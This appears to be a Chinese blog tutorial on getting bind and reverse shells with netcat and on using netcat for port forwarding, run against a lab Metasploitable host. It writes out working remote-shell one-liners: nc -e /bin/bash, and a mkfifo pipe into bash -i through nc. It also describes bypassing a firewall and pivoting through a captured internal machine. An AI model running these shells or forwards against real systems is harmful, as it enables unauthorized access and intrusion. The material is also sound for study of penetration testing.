获取shell

获取shell分成２种，一种是正向shell，一种是反向shell。这个和ssh实现正向代理与反向代理意思差不多。我的理解是：连接的方向与获取哪个shell。如果客户端连接服务器，想获取服务器的shell，那么称为正向shell，如果是客户端连接服务器，服务器端想获取客户端的shell，那么称为反向shell。



正向shell

如果nc带有-e选项可以直接使用 

nc serverIP PORT -e /bin/bash 

进行提供远程shell，这里我主要讲在没有-e选项的时候，如果用nc实现shell功能。



freestyle4568@freestyle4568 ~ $ mkfifo /tmp/fifo

freestyle4568@freestyle4568 ~ $ cat /tmp/fifo \| /bin/bash -i 2&gt;&1 \| nc -l 8000 &gt; /tmp/fifo

1

2

然后在客户端用



msfadmin@metasploitable:~$ nc 192.168.1.102 8000

1

然后就能连接成功，并且返回server端的shell。 

结果如下： 

客户端获得服务端shell 

原理详解： 

1. 创建fifo文件，管道文件用于将nc输出文件与bash的输入文件。 

2. cat /tmp/fifo是从fifo读取数据，将数据通过管道传给bash。 

3. \| /bin/bash -i 2&gt;&1这里需要注意2&gt;&1的意义，这是将２标准错误描述符重定向到１标准输出文件描述符指向的地方，为什么是＆１，而不是１呢，这是为了转义１的意思表示文件描述符而不是文件名为１。 

4. 将bash执行结果输入到nc输入中，从而可以传至客户端。 

5. 在客户端输入的命令数据通过服务端的nc输出重定向到fifo中，在服务端形成一个循环。



反向shell

又称为反弹shell，服务端要获取客户端的shell，客户端在连接上的时候将提供自己的shell功能给服务端。 

在服务端输入： 

nc -l 8001 

在客户端输入：



cat /tmp/fifo \| /bin/bash -i 2&gt;&1 \| nc 192.168.1.102 8001 &gt; /tmp/fifo

1

显示结果如下所示： 

反弹shell



netcat实现端口转发功能

网上介绍netcat的用法的文章实在太多了，这里我就不重复介绍了，一搜一大堆！这里介绍一种用netcat实现端口转发的方法，我在网上搜了半天，并没有找到相应的实现，多是反弹shell的实现。其实nc做端口转发的思路和shell功能的实现很相似，只需要稍加改造即可。 

为什么要端口转发呢？因为防火墙，或者外网访问内网的原因。比如防火墙不允许访问本机的3389端口怎么办，或者外网要想访问一台内网机器怎么办。这时端口转发可以很好的解决这些问题。 

1. 对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。 

2. 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。



实现

下面来看看如何用nc实现简单的端口转发。 

- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。 

- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。 

1. 在192.168.1.102上开启8000端口。 

nc -l 8000 

2. 在192.168.1.102上实现9000端口转发。 

freestyle4568@freestyle4568 ~ $ cat /tmp/fifo \| nc localhost 8000 \| nc -l 9000 &gt; /tmp/fifo 

3. 在192.168.1.103上连接192.168.1.102的9000端口。 

nc -n 192.168.1.102 9000 

结果如下图： 

端口转发

可以看到msfadmin成功的与freestyle4568的8000端口进行了通话，但是实际上连接的是它的9000端口。

